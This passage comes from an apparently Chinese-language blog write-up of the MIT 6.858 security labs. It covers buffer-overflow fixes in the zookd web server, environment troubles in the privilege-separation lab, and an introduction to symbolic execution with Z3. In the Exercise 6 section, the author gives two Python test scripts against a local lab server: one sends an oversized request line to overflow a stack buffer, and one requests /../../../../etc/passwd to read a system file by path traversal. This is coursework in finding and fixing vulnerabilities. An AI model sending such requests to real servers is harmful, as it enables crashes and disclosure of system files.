not just in the <code>zookd</code> binary but in other libraries that <code>zookd</code> loads at runtime. To see these libraries, and the addresses at which they are loaded, you can run <strong>( ulimit -s unlimited &amp;&amp; setarch -R ldd zookd-nxstack )</strong>. The <code>ulimit</code> and <code>setarch</code> commands set up the same environment used by <code>clean-env.sh</code>, so that <code>ldd</code> prints the same addresses that will be used at runtime.</p></blockquote><p>笔者一开始的思路就是不用  <code>accidentally()</code> （非常莫名其妙的一个函数），所以等于是直接通过了（笑）</p><h2 id="Part-4-Fixing-buffer-overflows-and-other-bugs"><a href="#Part-4-Fixing-buffer-overflows-and-other-bugs" class="headerlink" title="Part 4: Fixing buffer overflows and other bugs"></a>Part 4: Fixing buffer overflows and other bugs</h2><p>这一块就是两个 Exercise， 先看 Exercise 6，让我们寻找程序中的其他漏洞（至少两个，除了 <code>zoobar</code> 中的以外，那个是留给未来的其他 labs 的）：</p><blockquote><p><strong>Exercise 6.</strong> Look through the source code and try to find more vulnerabilities that can allow an attacker to compromise the security of the web server. Describe the attacks you have found in <code>answers.txt</code>, along with an explanation of the limitations of the attack, what an attacker can accomplish, why it works, and how you might go about fixing or preventing it. You should ignore bugs in <code>zoobar</code>‘s code. They will be addressed in future labs.</p><p>One approach for finding vulnerabilities is to trace the flow of inputs controlled by the attacker through the server code. At each point that the attacker’s input is used, consider all the possible values the attacker might have provided at that point, and what the attacker can achieve in that manner.</p><p>You should find at least two vulnerabilities for this exercise.</p></blockquote><p><del>源码审计还是比较简单的，但是</del>笔者审了大半天好像也没找到除了上面的 bug 以外的 bug，还好后面还是找到了一些</p><p>首先是在 <code>process_client()</code> 中存储请求 URL 的长度的位置存在一个栈溢出，因为一次最多一行读 8192 字节，但这里明显没有预留足够的空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<span class="hljs-comment">// 只留了4096字节</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span> <span class="hljs-comment">// 这里一次最多读 8192 字节</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br></code></pre></td></tr></table></figure><p>简单测试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> * <span class="hljs-number">768</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>成功 crash，不过这里并非因为非法返回地址 crash，而是因为我们覆写掉了栈上的 <code>errmsg</code> 变量导致非法内存引用从而 crash</p><p><img src="https://s2.loli.net/2022/12/04/t9vq36KXmZOIslJ.png" alt="image.png"></p><p>第二个漏洞是在 <code>http_serve</code> 中存在目录穿越的问题，由于没有对路径做过滤及判断，这可以让我们访问到服务器根目录外的文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span><br>&#123;<br>    <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = http_serve_none;<br>    <span class="hljs-type">char</span> pn[<span class="hljs-number">2048</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><br>    getcwd(pn, <span class="hljs-keyword">sizeof</span>(pn));<br>    setenv(<span class="hljs-string">&quot;DOCUMENT_ROOT&quot;</span>, pn, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(name) + <span class="hljs-built_in">strlen</span>(pn) + <span class="hljs-number">1</span> &gt;= <span class="hljs-keyword">sizeof</span>(pn)) &#123;<br>        http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;Request too long&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">strncat</span>(pn, name, <span class="hljs-keyword">sizeof</span>(pn) - <span class="hljs-built_in">strlen</span>(pn) - <span class="hljs-number">1</span>);<br>    split_path(pn);<br><br>    <span class="hljs-keyword">if</span> (!stat(pn, &amp;st))<br>    &#123;<br>        <span class="hljs-comment">/* executable bits -- run as CGI script */</span><br>        <span class="hljs-keyword">if</span> (valid_cgi_script(&amp;st))<br>            handler = http_serve_executable;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (S_ISDIR(st.st_mode))<br>            handler = http_serve_directory;<br>        <span class="hljs-keyword">else</span><br>            handler = http_serve_file;<br>    &#125;<br><br>    handler(fd, pn);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve_file</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pn)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">if</span> ((filefd = open(pn, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;open %s: %s&quot;</span>, pn, strerror(errno));<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BSD</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">if</span> (!fstat(filefd, &amp;st))<br>        len = st.st_size;<br>    <span class="hljs-keyword">if</span> (sendfile(fd, filefd, <span class="hljs-number">0</span>, len) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">if</span> (sendfile(filefd, fd, <span class="hljs-number">0</span>, &amp;len, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;sendfile&quot;</span>);<br>    close(filefd);<br>&#125;<br></code></pre></td></tr></table></figure><p>简单写个脚本测试下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /../../../../etc/passwd&quot;</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;REQUEST_URI: &quot;</span> + <span class="hljs-string">b&quot;index.html&quot;</span>  + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>成功访问到 <code>/etc/passwd</code></p><p><img src="https://s2.loli.net/2022/12/04/dlv6JVCk91QhcyW.png" alt="image.png"></p><p>Exercise 6 里说 <code>You should find at least two vulnerabilities for this exercise.</code> ，笔者已经找足两个，满足了题目要求，就不继续找更多的了（笑）<del>👴选择直接摆大烂</del></p><p>接下来看最后一个 Exercise，让我们进行漏洞修复，主要是修找到的栈溢出漏洞：</p><blockquote><p><strong>Exercise 7.</strong> For each buffer overflow vulnerability you have exploited in Exercises 2, 4, and 5, fix the web server’s code to prevent the vulnerability in the first place. Do not rely on compile-time or runtime mechanisms such as <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">stack canaries</a>, removing <code>-fno-stack-protector</code>, baggy bounds checking, etc.</p><p>Make sure that your code actually stops your exploits from working. Use <strong>make check-fixed</strong> to run your exploits against your modified source code (as opposed to the staff reference binaries from <code>bin.tar.gz</code>). These checks should report FAIL (i.e., exploit no longer works). If they report PASS, this means the exploit still works, and you did not correctly fix the vulnerability.</p><p>Note that your submission should <em>not</em> make changes to the <code>Makefile</code> and other grading scripts. We will use our unmodified version during grading.</p><p>You should also make sure your code still passes all tests using <strong>make check</strong>, which uses the unmodified lab binaries.</p></blockquote><p>主要是修这两个地方：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> value[<span class="hljs-number">8192</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><p>使用如下命令进行检查，攻击全部失败代表成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-fixed</span><br></code></pre></td></tr></table></figure><p>成功通过√</p><p><img src="https://s2.loli.net/2022/12/04/6XNYjFW7BdPr1Re.png" alt="image.png"></p><p>至此， Lab1 全部完成</p><h1 id="0x02-Lab-2-Privilege-separation-and-server-side-sandboxing（uncompleted）"><a href="#0x02-Lab-2-Privilege-separation-and-server-side-sandboxing（uncompleted）" class="headerlink" title="0x02.Lab 2: Privilege separation and server-side sandboxing（uncompleted）"></a>0x02.Lab 2: Privilege separation and server-side sandboxing（uncompleted）</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这一个 lab 主要是关于 <strong>权限分离</strong> （privilege separation）与 <strong>服务器侧沙箱</strong>（server-side sandboxing），这一部分我们主要通过一个 MIT 编写的名为 <code>zoobar</code> 的 python web 应用来完成，其中权限隔离的目的是保证攻击者在破坏程序的一部分时不会破坏到程序的另一部分，该 lab 将使用 <a href="https://linuxcontainers.org/">Linux containers</a> 来完成</p><blockquote><p>此前的 lab 中使用的是在课上讲过的 OKWS web server（<del>👴没听课，寄了</del>）</p></blockquote><p>本 lab 中我们将完成一个权限隔离的 web server，检查看你的漏洞，并将程序代码分割成需要更少权限的内容快以最小化单个漏洞的影响，同时我们还将扩展 Zoobar 以使其支持  <em>可执行配置文件</em>  （executable profiles），这允许我们使用 python 来作为配置文件，并完成不同用户配置文件的隔离，这允许用户在其配置文件中实现不同的功能，例如：</p><ul><li>一个按用户名欢迎访客的 profile</li><li>一个记录最后几位访客的 profile</li><li>一个为每位访客提供 zoobar 的 profile（限制为每分钟1位）</li></ul><p>这需要沙箱化服务器上的 profile code 从而避免任意代码执行或任意文件访问，此外，这些代码或许需要保持记录一些文件中的数据，或是访问 zoobar 数据库以正确执行，我们将使用名为库的远程过程与 lab 提供的一些代码来沙箱化可执行配置文件</p><blockquote><p>实验手册原文就挺乱七八糟的，👴愣是没咋看明白，<del>也可能是👴的英文水平太垃圾了</del></p></blockquote><p>那么接下来首先还是把代码切到 lab2 的分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add answers.txt exploit-*.py http.c zookd.c [and any other new files...]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&quot;lab1 solution completed&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab1</span><br></code></pre></td></tr></table></figure><p>之后还是先 <code>make</code> 检查一下，没报错就 🆗：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookfs.o zookfs.c<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o http2.o http2.c<br>cc -m64  zookfs.o http2.o   -o zookfs<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookd2.o zookd2.c<br>cc -m64  zookd2.o http2.o   -o zookd2<br></code></pre></td></tr></table></figure><h2 id="Prelude-What’s-a-zoobar"><a href="#Prelude-What’s-a-zoobar" class="headerlink" title="Prelude: What’s a zoobar?"></a>Prelude: What’s a zoobar?</h2><p>为了理解 <code>zoobar</code>，我们首先过一下部分源码</p><p><code>zoobar</code> 的一个重要特性是允许在用户之间传递凭证（credits），这由 <code>transfer.py</code> 实现，我们可以启动 zoobar 感受一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./zookld.py</span><br></code></pre></td></tr></table></figure><p>这玩意需要 python 的 <code>lxc</code> 模块才能跑，但是笔者怎么都安不上…<del>lab2 就此完结</del> </p><p>笔者最终选择  <em>放弃使用自己搭建的实验环境</em>  ，重新使用 MIT 提供的 VM 镜像环境去做实验，但是在执行 <code>./zookld.py</code> 时又遇到了一个问题：</p><p><img src="https://s2.loli.net/2022/12/07/E5rjcJBSFHQOifo.png" alt="image.png"></p><p>那么这个问题的出现是因为 <strong>Ubuntu 21.10 已经停止更新</strong>，我们来看 <code>zookld.py</code> 的逻辑，比较简单，主要就是直接调用 <code>zookconf.py</code> 里的 <code>boot()</code> 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zookconf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">2</span>:<br>        zookconf.boot(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">else</span>:<br>        zookconf.boot()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    zookconf.restart_with_cgroups()<br>    <span class="hljs-keyword">if</span> os.geteuid() == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Running zookld.py as root! In order to clean up &quot;</span><br>        <span class="hljs-string">&quot;containers from this run, you must run zookclean.py as root as well.&quot;</span>,<br>        file=sys.stderr)<br>    main()<br></code></pre></td></tr></table></figure><p>里面存在这样一个调用链：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">boot()<br>Container.__init__()<br>    Container.make_container()<br>        Container.make_base()<br>            Container.configure_base()<br></code></pre></td></tr></table></figure><p>在 <code>configure_base()</code> 中有着一个调用 <code>apt-get</code> 的逻辑，由于 <strong>Ubuntu 21.10 已经 <a href="https://help.ubuntu.com/community/EOLUpgrades">EOL</a> 了，所以这一步是必然会失败的</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">configure_base</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># ...</span><br>    <span class="hljs-comment"># install packages for zoobar</span><br>    <span class="hljs-comment"># terminate early if anything goes wrong here</span><br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>], extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed updating apt package info&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;install&quot;</span>, <span class="hljs-string">&quot;-y&quot;</span>] + pkgs, extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed installing packages&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><blockquote><p>参见 <a href="https://askubuntu.com/questions/1420190/upgrade-to-22-04-impish-release-no-longer-has-a-release-file">ask ubuntu</a> 与 <a href="https://fridge.ubuntu.com/2022/07/19/ubuntu-21-10-impish-indri-end-of-life-reached-on-july-14-2022/">Ubuntu Fridge</a></p><blockquote><p><del>👴真的麻了，这实验™是 MIT 今年春季学期发布的，用个 20.04 这样的 LTS 不好🐎，用个就只剩几个🈷寿命的 21.10 就离谱</del></p></blockquote></blockquote><p>MIT 估计是不会修这个问题了，而下一次的实验手册得等到 2023 年的春季学期才能上线，那这里笔者只能自行尝试解决这个问题了: (</p><p>这里笔者试了好几种方法都没能成功将 Ubuntu 21.10 升级成 22.04 或是其他的可用版本，最后笔者将 <code>apt-get</code> 替换成 <code>apt</code> 之后倒是能跑了，不过<strong>无法正常访问 zoobar 服务器</strong>，会报一个 module not found 但是实际上已经安装有对应模块的错误 : (</p><blockquote><p>这里先🕊了，要是之后能重新做上再补，还好几个 lab 之间并非依赖关系可以让笔者先往后继续做 lab3 : )</p></blockquote><h1 id="0x03-Lab-3-Symbolic-execution"><a href="#0x03-Lab-3-Symbolic-execution" class="headerlink" title="0x03.Lab 3: Symbolic execution"></a>0x03.Lab 3: Symbolic execution</h1><h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p>本 lab 将教大家使用 <strong>符号执行</strong> （<strong>symbolic execution</strong>） 这一强大的技术来寻找软件中的漏洞，在 lab 的最后我们将建立一个可以在 zoobar web 应用中寻找触发多种漏洞的符号执行系统（准确的说是一个<strong>混合执行</strong>（concolic execution）系统）</p><blockquote><p>关于什么是 concolic execution，可以看这张图</p><p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" alt="concolic execution"></p></blockquote><p>在 <a href="http://css.csail.mit.edu/6.858/2022/readings/exe.pdf">EXE paper</a> 中描述了一个用于 C 程序的符号执行系统，为了简单化，该 lab 将通过修改 Python 对象与重载特定方法来为 Python 程序建立一个符号&#x2F;混合执行系统，类似于 EXE，我们将使用一个 SMT （ <a href="https://en.wikipedia.org/wiki/Satisfiability_Modulo_Theories">Satisfiability Modulo Theories</a>，可满足性模理论）求解器来检查可满足的约束，这意味着我们的求解器可以检查同时包含传统布尔可满足性表达式与涉及其他“理论”的约束如整型、位向量、字符串等</p><p>本 lab 初始我们首先要通过计算 32 位有&#x2F;无符号数的平均值来熟悉 <strong>Z3</strong>——一个流行的 SMT 求解器，接下来我们将为 Python 整型操作创建 wrappers（类似 EXE 提供了符号变量上的操作置换），并应用调用 Z3 的核心逻辑来探索可能的不同执行路径；最终我们将探索如何将其应用在 web 应用程序上，以对字符串进行求解，我们将为 Python 的字符串操作套一层 wrapper，在 SQLalchemy 数据库接口上应用对符号化友好的（symbolic-friendly）wrapper，并使用这个系统寻找 Zoobar 中的漏洞</p><blockquote><p>上面两段都是抄实验手册的</p></blockquote><p>接下来首先还是惯例地切换到 lab 3 的分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&#x27;lab2 completed&#x27;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span><br></code></pre></td></tr></table></figure><p>这里注意不要将 lab 2 的代码合并到 lab 3 里边，因为我们的符号执行系统无法通过 RPC 追踪多进程间的符号约束，所以我们在一个没有进行权限分离的 Zoobar 上进行符号执行</p><p>接下来是检查代码可用性：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check</span><br></code></pre></td></tr></table></figure><p>结果如下就🆗，需要注意的是符号执行系统是 CPU 密集型的，因此对于不开启 KVM 支持的 QEMU 而言会非常慢：</p><p><img src="https://s2.loli.net/2022/12/12/AlWaHU6RhcE3TpN.png" alt="image.png">、</p><h2 id="Using-an-SMT-solver"><a href="#Using-an-SMT-solver" class="headerlink" title="Using an SMT solver"></a>Using an SMT solver</h2><p>符号执行的核心是 <strong>可满足性模理论求解器</strong>（<strong>Satisfiability Modulo Theory solver</strong>， 即 <code>SMT solver</code>），在本 lab 中我们将使用微软开发的 <a href="https://github.com/Z3Prover/z3">Z3 solver</a> 的 Python-based API（参见 <a href="https://ericpony.github.io/z3py-tutorial/">z3py tutorial</a> &amp; <a href="https://z3prover.github.io/api/html/namespacez3py.html">documentation for Z3’s Python API</a>），并使用  <a href="https://rise4fun.com/z3/tutorialcontent/sequences">Z3’s support for strings</a>；本 Lab 带有一个构建自 <a href="https://github.com/Z3Prover/z3">Z3 github repo</a> 的 Z3</p><p>实验提供了 <code>int-avg.py</code> 作为使用 Z3 的例子：  <em>计算两个 32 位整型的平均值</em>  ，一个最简单的算法是 <code>(x + y) / 2</code> ，但这可能会发生<strong>整型上溢</strong>，从而得到  <em>模 2<sup>32</sup></em> 上的值（想了解更多，参见  <a href="https://people.csail.mit.edu/nickolai/papers/wang-kint-2013-06-24.pdf">KINT paper</a> ）——Z3 可以帮我们检查这个错误：予其一个布尔表达式，Z3 可以告诉我们其<strong>是否为真</strong>（即可以被满足）；若表达式可以为真且包含一些变量，Z3 可以给我们一些使表达式为真的🌰变量</p><p>现在我们来看这份代码（这里不会仔细讲 Z3 的用法，不懂的 <a href="https://z3prover.github.io/api/html/">自行查文档</a>），其首先会使用 Z3 创建两个 32 位的位向量 a 与 b：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> z3<br><br><span class="hljs-comment">## Construct two 32-bit integer values.  Do not change this code.</span><br>a = z3.BitVec(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">32</span>)<br>b = z3.BitVec(<span class="hljs-string">&#x27;b&#x27;</span>, <span 